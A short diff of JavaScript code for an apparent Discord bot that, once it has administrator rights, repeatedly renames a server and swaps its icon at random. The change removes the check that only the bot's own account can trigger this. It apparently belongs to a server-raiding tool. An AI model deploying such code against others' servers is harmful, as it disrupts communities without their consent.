@@ -398,7 +398,6 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
  return
   }
- if(message.author.id !== message.client.user.id) {return}
   setTimeout(() => {
      message.guild.setName(randomnames())
      message.guild.setIcon(randomicons123())
